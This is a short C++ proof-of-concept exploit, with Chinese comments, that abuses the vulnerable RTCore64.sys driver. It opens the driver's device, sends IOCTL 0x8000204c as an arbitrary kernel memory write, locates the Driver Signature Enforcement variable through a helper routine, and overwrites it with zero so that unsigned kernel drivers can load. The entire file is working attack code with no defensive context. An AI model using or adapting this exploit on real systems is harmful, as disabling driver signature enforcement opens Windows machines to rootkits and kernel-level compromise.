#include "global.h"
#include <aclapi.h>
#include <Psapi.h>
#include <iostream>

struct RTCORE64_MEMORY
{
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{
    RTCORE64_MEMORY MemoryRead {};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    // 觸發 RTCore64.sys 的任意寫漏洞
    DWORD BytesReturned;
    DeviceIoControl(Device, 0x8000204c, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned,
                    nullptr);
}

int main(int argc, char* argv[])
{
    // 取得 Device Handle
    HANDLE hDevice = CreateFile(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        return 1;
    }

    // 取得 DSE 的位址
    PVOID DSE;
    NTSTATUS Status = AnalyzeCi(&DSE);

    // 4. 竄改 DSE 的值成 0
    WriteMemoryPrimitive(hDevice, 1, (DWORD64)DSE, 0);

    return 0;
}
